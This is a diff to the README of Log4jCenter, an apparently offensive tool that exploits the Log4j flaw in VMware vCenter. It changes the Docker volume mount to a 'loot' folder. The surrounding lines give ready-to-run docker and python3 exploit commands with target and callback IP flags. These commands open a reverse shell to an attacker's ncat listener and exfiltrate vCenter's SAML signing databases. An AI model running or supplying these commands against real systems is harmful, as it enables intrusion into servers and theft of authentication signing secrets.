@@ -47,7 +47,7 @@ git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
 To run the container, run a command similar to the following with your command line flags appended. For example, the command below would be used to exploit vCenter and get a reverse shell. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:
 
 ```
-docker run -it -v $(pwd):/Log4jCenter -p 8090:8090 -p 1389:1389 log4jcenter \ 
+docker run -it -v $(pwd)/loot:/Log4jCenter/loot -p 8090:8090 -p 1389:1389 log4jcenter \ 
     -t 10.100.100.1 -i 192.168.1.1 -p 4444 -r
 ```
 
@@ -78,7 +78,7 @@ python3 exploit.py -t vcenter.acme.com -i 10.10.10.1 -p 4444 -r
 Exfiltrate the SAML signing databases from within a Docker container:
 
 ```
-docker run -it -v $(pwd):/Log4jCenter -p 1389:1389 -p 8090:8090 log4jcenter \
+docker run -it -v $(pwd)/loot:/Log4jCenter/loot -p 1389:1389 -p 8090:8090 log4jcenter \
     -t 10.100.100.1 -i 192.168.1.1 -e
 ```
 
